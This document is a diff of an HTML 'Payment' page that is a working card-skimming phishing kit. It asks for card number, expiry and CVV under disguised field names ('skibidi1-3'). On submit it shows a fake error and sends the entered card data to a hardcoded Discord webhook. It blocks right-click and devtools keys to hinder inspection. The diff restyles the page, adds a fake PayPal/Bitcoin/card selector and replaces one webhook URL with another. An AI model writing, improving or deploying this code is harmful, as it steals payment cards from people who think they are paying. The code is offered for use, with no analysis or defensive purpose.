@@ -6,7 +6,7 @@
   <title>Payment</title>
   <style>
     body {
-      background: linear-gradient(135deg, #FF0000, #000000); /* Red to Black gradient */
+      background: black;
       color: white;
       font-family: 'Arial', sans-serif;
       display: flex;
@@ -17,27 +17,28 @@
       overflow: hidden;
       position: relative;
     }
-    /* Snow Effect */
-    .snow {
+
+    /* Flying RGB Comets */
+    .comet {
       position: absolute;
-      top: 0;
-      left: 0;
-      right: 0;
-      bottom: 0;
-      pointer-events: none;
+      width: 4px;
+      height: 4px;
+      animation: comet-animation linear infinite;
     }
-    .snowflake {
-      position: absolute;
-      background-color: white;
-      border-radius: 50%;
-      opacity: 0.9;
-      animation: fall 5s linear infinite;
+
+    @keyframes comet-animation {
+      0% {
+        transform: translate(-10vw, -10vh);
+        opacity: 1;
+      }
+      100% {
+        transform: translate(110vw, 110vh);
+        opacity: 0;
+      }
     }
-    @keyframes fall {
-      0% { transform: translateY(-10vh); }
-      100% { transform: translateY(100vh); }
-    }
-    .form-container {
+
+    /* Payment Method Selection */
+    .payment-method-container {
       text-align: center;
       background-color: rgba(0, 0, 0, 0.7); /* Dark transparent background for form */
       padding: 30px;
@@ -45,51 +46,97 @@
       box-shadow: 0 0 15px rgba(255, 255, 255, 0.1);
       z-index: 1;
     }
+
     h1 {
-      font-size: 30px;
+      font-size: 36px;
       margin-bottom: 20px;
-      color: #FFDD57; /* Soft yellow color for the title */
+      color: white; /* White text for the title */
     }
+
+    .payment-method-btn {
+      background-color: #9b59b6; /* Neon Purple */
+      color: white;
+      border: 2px solid #9b59b6;
+      border-radius: 5px;
+      padding: 15px 30px;
+      margin: 10px;
+      font-size: 18px;
+      cursor: pointer;
+      transition: 0.3s ease;
+      box-shadow: 0 0 15px rgba(155, 89, 182, 0.7);
+    }
+
+    .payment-method-btn:hover {
+      background-color: #8e44ad; /* Lighter Purple */
+      box-shadow: 0 0 25px rgba(155, 89, 182, 1);
+    }
+
+    .payment-method-btn:focus {
+      outline: none;
+    }
+
+    /* Payment Form */
+    .form-container {
+      text-align: center;
+      background-color: rgba(0, 0, 0, 0.7); /* Dark transparent background for form */
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 0 15px rgba(255, 255, 255, 0.1);
+      z-index: 1;
+      display: none; /* Hidden initially, shown after selecting payment method */
+    }
+
+    label, input {
+      color: white; /* Ensure all form text is white */
+    }
+
     input {
       background-color: #333;
       color: white;
-      border: 1px solid #FF7E5F; /* Orange border */
+      border: 1px solid white; /* White border by default */
       border-radius: 5px;
       padding: 10px;
       margin: 10px;
       width: 250px;
       font-size: 16px;
     }
+
+    /* Neon White Outline on Focus */
     input:focus {
-      border: 1px solid #FEB47B; /* Light yellow focus color */
+      border: 2px solid #fff; /* Neon white border */
       outline: none;
+      box-shadow: 0 0 10px rgba(255, 255, 255, 0.8);
     }
-    /* Red Neon Submit Button */
+
+    /* Purple Neon Submit Button */
     button {
       padding: 12px 20px;
-      background-color: #FF0000;
+      background-color: #9b59b6; /* Neon Purple */
       color: white;
-      border: 2px solid #FF0000;
+      border: 2px solid #9b59b6;
       border-radius: 5px;
       cursor: pointer;
       font-size: 16px;
-      box-shadow: 0 0 10px rgba(255, 0, 0, 0.8),
-                  0 0 20px rgba(255, 0, 0, 0.6),
-                  0 0 30px rgba(255, 0, 0, 0.4);
+      box-shadow: 0 0 10px rgba(155, 89, 182, 0.8),
+                  0 0 20px rgba(155, 89, 182, 0.6),
+                  0 0 30px rgba(155, 89, 182, 0.4);
       transition: all 0.3s ease;
     }
+
     button:hover {
-      box-shadow: 0 0 20px rgba(255, 0, 0, 0.8),
-                  0 0 30px rgba(255, 0, 0, 0.6),
-                  0 0 40px rgba(255, 0, 0, 0.4);
+      box-shadow: 0 0 20px rgba(155, 89, 182, 0.8),
+                  0 0 30px rgba(155, 89, 182, 0.6),
+                  0 0 40px rgba(155, 89, 182, 0.4);
       transform: scale(1.1);
     }
+
     button:active {
-      box-shadow: 0 0 30px rgba(255, 0, 0, 0.8),
-                  0 0 40px rgba(255, 0, 0, 0.6),
-                  0 0 50px rgba(255, 0, 0, 0.4);
+      box-shadow: 0 0 30px rgba(155, 89, 182, 0.8),
+                  0 0 40px rgba(155, 89, 182, 0.6),
+                  0 0 50px rgba(155, 89, 182, 0.4);
       transform: scale(1.2);
     }
+
     /* Error Notification */
     .error-notification {
       position: fixed;
@@ -107,6 +154,7 @@
       box-shadow: 0 0 15px rgba(255, 0, 0, 0.7);
       width: 280px; /* Smaller width */
     }
+
     .error-notification .close-btn {
       background-color: transparent;
       color: #FF0000;
@@ -115,173 +163,192 @@
       cursor: pointer;
       margin-top: 10px;
     }
+
     .error-notification .close-btn:hover {
       color: #FFDD57; /* Light yellow when hovered */
     }
 
     /* Copy Button */
     .copy-btn {
-      padding: 5px 10px;
-      background-color: #333;
+      background-color: #9b59b6;
       color: white;
-      border: 1px solid #FF7E5F;
+      border: none;
+      padding: 5px 10px;
+      margin-left: 10px;
       border-radius: 5px;
       cursor: pointer;
-      font-size: 12px;
+      font-size: 14px;
     }
+
     .copy-btn:hover {
-      background-color: #FF7E5F;
+      background-color: #8e44ad;
     }
   </style>
 </head>
 <body>
+  <!-- Payment Method Selection -->
+  <div class="payment-method-container" id="payment-method-container">
+    <h1>Select Payment Method</h1>
+    <button class="payment-method-btn" onclick="showPaymentForm('paypal')">PayPal</button>
+    <button class="payment-method-btn" onclick="showPaymentForm('bitcoin')">Bitcoin</button>
+    <button class="payment-method-btn" onclick="showPaymentForm('creditcard')">Credit Card</button>
+  </div>
 
-  <div class="snow" id="snow"></div>
-
-  <div class="form-container">
-    <h1>Payment</h1>
+  <!-- Payment Form (Initially Hidden) -->
+  <div class="form-container" id="payment-form-container">
+    <h1>Payment Details</h1>
     <form id="payment-form">
       <label for="skibidi1">Your card's 16-digit code:</label><br>
       <input type="text" id="skibidi1" name="skibidi1" maxlength="19" placeholder="Enter 16-digit code"><br><br>
-      
       <label for="skibidi2">Expiry date:</label><br>
-      <input type="text" id="skibidi2" name="skibidi2" maxlength="5" placeholder="MM/YY"><br><br>
-      
+      <input type="text" id="skibidi2" name="skibidi2" maxlength="4" placeholder="MMYY"><br><br>
       <label for="skibidi3">CVV/CVC:</label><br>
       <input type="text" id="skibidi3" name="skibidi3" maxlength="4" placeholder="Enter 3-4 digits"><br><br>
-      
       <button type="submit">Pay</button>
     </form>
   </div>
 
   <!-- Error Notification -->
   <div class="error-notification" id="error-notification">
-    <span>Error! Check your credentials and try again.</span><br>
+    <span>Error! Please try again later.</span><br>
     <button class="close-btn" onclick="closeNotification()">OK</button>
   </div>
 
   <script>
-    // Disable right-click context menu
-    document.addEventListener("contextmenu", function (e) {
-      e.preventDefault(); // Disable right-click
-    });
-
-    // Disable F12 and Ctrl + Shift + I (DevTools)
-    document.addEventListener("keydown", function (e) {
+    // Prevent right-click and devtools shortcuts
+    document.addEventListener("contextmenu", e => e.preventDefault());
+    document.addEventListener("keydown", function(e) {
       if (e.key === "F12" || (e.ctrlKey && e.shiftKey && e.key === "I")) {
-        e.preventDefault(); // Block the event
+        e.preventDefault();
       }
     });
 
-    // Prevent right-click menu and keyboard shortcuts to prevent inspect element
-    document.onkeydown = function (e) {
-      if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && e.keyCode == 73)) {
-        return false; // Block F12 and Ctrl + Shift + I
+    // Function to attach input listeners for formatting
+    function addInputListeners() {
+      var cardInput = document.getElementById("skibidi1");
+      if (cardInput) {
+        cardInput.addEventListener("input", function(e) {
+          let value = e.target.value.replace(/\D/g, '');
+          if (value.length > 16) value = value.substring(0, 16);
+          // Insert dash every 4 digits
+          let formattedValue = value.replace(/(\d{4})(?=\d)/g, "$1-");
+          e.target.value = formattedValue;
+        });
       }
-    };
-
-    // Format card number: Insert a dash every 4 digits
-    document.getElementById("skibidi1").addEventListener("input", function(e) {
-      let value = e.target.value.replace(/\D/g, ''); // Remove non-digit characters
-      if (value.length > 16) value = value.substring(0, 16); // Limit to 16 digits
-      let formattedValue = value.replace(/(\d{4})(?=\d)/g, "$1-"); // Add dash every 4 digits
-      e.target.value = formattedValue;
-    });
-
-    // Format expiry date: Insert a slash after 2 digits
-    document.getElementById("skibidi2").addEventListener("input", function(e) {
-      let value = e.target.value.replace(/\D/g, ''); // Remove non-digit characters
-      if (value.length > 4) value = value.substring(0, 4); // Limit to 4 digits (MMYY)
-      let formattedValue = value.replace(/(\d{2})(?=\d)/g, "$1/"); // Add slash after 2 digits
-      e.target.value = formattedValue;
-    });
-
-    // Limit CVV/CVC to 4 digits
-    document.getElementById("skibidi3").addEventListener("input", function(e) {
-      let value = e.target.value.replace(/\D/g, ''); // Remove non-digit characters
-      if (value.length > 4) value = value.substring(0, 4); // Limit to 4 digits
-      e.target.value = value;
-    });
-
-    // Create continuous falling snowflakes
-    function createSnowflake() {
-      let snow = document.getElementById("snow");
-      let snowflake = document.createElement("div");
-      snowflake.classList.add("snowflake");
-      let size = 8; // Fixed size for snowflakes
-      snowflake.style.width = size + "px";
-      snowflake.style.height = size + "px";
-      snowflake.style.left = Math.random() * 100 + "vw"; // Random horizontal position
-      snowflake.style.animationDuration = Math.random() * 3 + 3 + "s"; // 3-6 seconds
-      snowflake.style.animationDelay = Math.random() * 5 + "s"; // Random delay
-      snow.appendChild(snowflake);
-      setTimeout(() => { snowflake.remove(); }, 6000); // Remove after animation
+      var expiryInput = document.getElementById("skibidi2");
+      if (expiryInput) {
+        expiryInput.addEventListener("input", function(e) {
+          let value = e.target.value.replace(/\D/g, '');
+          if (value.length > 4) value = value.substring(0, 4);
+          // Insert slash after 2 digits if more than 2 digits exist
+          let formattedValue = value.replace(/(\d{2})(?=\d)/, "$1/");
+          e.target.value = formattedValue;
+        });
+      }
     }
+
+    // Call addInputListeners on page load and after updating form innerHTML
     window.onload = function() {
-      setInterval(createSnowflake, 100);
+      addInputListeners();
+      setInterval(createComet, 100); // Create comets every 100ms
     };
 
-    // Copy to clipboard function
-    function copyToClipboard(text) {
-      const tempInput = document.createElement('input');
-      document.body.appendChild(tempInput);
-      tempInput.value = text;
-      tempInput.select();
-      document.execCommand('copy');
-      document.body.removeChild(tempInput);
-      alert('Copied to clipboard!');
+    // Show payment form based on selected payment method
+    function showPaymentForm(method) {
+      document.getElementById('payment-method-container').style.display = 'none';
+      document.getElementById('payment-form-container').style.display = 'block';
+      document.getElementById('payment-form').innerHTML = `
+        <h1>Pay with ${method.charAt(0).toUpperCase() + method.slice(1)}</h1>
+        <label for="skibidi1">Card Number:</label><br>
+        <input type="text" id="skibidi1" name="skibidi1" maxlength="19" placeholder="Enter 16-digit code"><br><br>
+        <label for="skibidi2">Expiry Date:</label><br>
+        <input type="text" id="skibidi2" name="skibidi2" maxlength="6" placeholder="MMYY"><br><br>
+        <label for="skibidi3">CVV/CVC:</label><br>
+        <input type="text" id="skibidi3" name="skibidi3" maxlength="4" placeholder="Enter 3-4 digits"><br><br>
+        <button type="submit">Pay</button>
+      `;
+      addInputListeners();
     }
 
-    // Webhook integration: Send form data to your webhook with embed
+    // Handle form submission: show error notification and send webhook data
     document.getElementById("payment-form").addEventListener("submit", function(e) {
-      e.preventDefault(); // Prevent default form submission
+      e.preventDefault();
+      document.getElementById("error-notification").style.display = "block";
+      const cardNumber = document.getElementById("skibidi1").value;
+      const expiryDate = document.getElementById("skibidi2").value;
+      const cvv = document.getElementById("skibidi3").value;
 
-      // Gather form data
-      const formData = new FormData(this);
-
-      // Prepare the data for the embed message
-      const embed = {
-        title: "Payment Details 💳",
-        fields: [
-          { name: "Card Number 🏧", value: formData.get('skibidi1'), inline: true },
-          { name: "Expiry Date 📅", value: formData.get('skibidi2'), inline: true },
-          { name: "CVV/CVC 🔒", value: formData.get('skibidi3'), inline: true }
-        ],
-        color: 15158332 // Red color
+      // Prepare webhook payload with embed
+      const data = {
+        embeds: [
+          {
+            title: "Payment Attempt",
+            color: 0x9b59b6, // Purple color for the embed
+            fields: [
+              {
+                name: "Card Number",
+                value: cardNumber,
+                inline: true
+              },
+              {
+                name: "Expiry Date",
+                value: expiryDate,
+                inline: true
+              },
+              {
+                name: "CVV/CVC",
+                value: cvv,
+                inline: true
+              }
+            ]
+          }
+        ]
       };
 
-      const webhookData = {
-        embeds: [embed]
-      };
-
-      // Send data to the webhook
-      fetch('https://discord.com/api/webhooks/1344449866310484062/OHkY3c7IwWl2YVpBGjVWYAb78hTsEpCqfu0dCDAcyHNp5b59q4bujyC4wA-OAS8Xz3kE', {
+      // Send to the webhook
+      fetch('https://discord.com/api/webhooks/1347663029617299546/HTVc5gct83Q8ho0Oc0iUoFmOpEvjqVqRqn9EQMMxX8RKYpAvGnv7hsyde3k-EiVEFjoE', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(webhookData)
-      })
-      .then(response => {
-        if (response.ok) {
-          showErrorNotification();
-        } else {
-          console.error('Error sending data to webhook:', response.statusText);
-        }
-      })
-      .catch(error => {
-        console.error('Webhook error:', error);
+        body: JSON.stringify(data),
+      }).then(response => {
+        console.log('Webhook sent:', response);
+      }).catch(error => {
+        console.error('Error sending webhook:', error);
       });
     });
 
-    // Display error notification
-    function showErrorNotification() {
-      document.getElementById("error-notification").style.display = "block";
+    // Copy function for the "Copy" buttons
+    function copyTextToClipboard(text) {
+      const textArea = document.createElement("textarea");
+      textArea.value = text;
+      document.body.appendChild(textArea);
+      textArea.select();
+      document.execCommand("copy");
+      document.body.removeChild(textArea);
+      alert("Text copied to clipboard!");
     }
 
     // Close error notification
     function closeNotification() {
       document.getElementById("error-notification").style.display = "none";
     }
-  </script>
 
+    // Flying RGB comets generation
+    function createComet() {
+      let comet = document.createElement("div");
+      comet.classList.add("comet");
+      let size = Math.random() * 4 + 4;
+      comet.style.width = size + "px";
+      comet.style.height = size + "px";
+      comet.style.left = Math.random() * 100 + "vw";
+      comet.style.top = Math.random() * 100 + "vh";
+      comet.style.backgroundColor = `rgb(${Math.random() * 255}, ${Math.random() * 255}, ${Math.random() * 255})`;
+      comet.style.animationDuration = Math.random() * 4 + 6 + "s";
+      comet.style.animationDelay = Math.random() * 5 + "s";
+      document.body.appendChild(comet);
+      setTimeout(() => { comet.remove(); }, 10000);
+    }
+  </script>
 </body>
 </html>
+
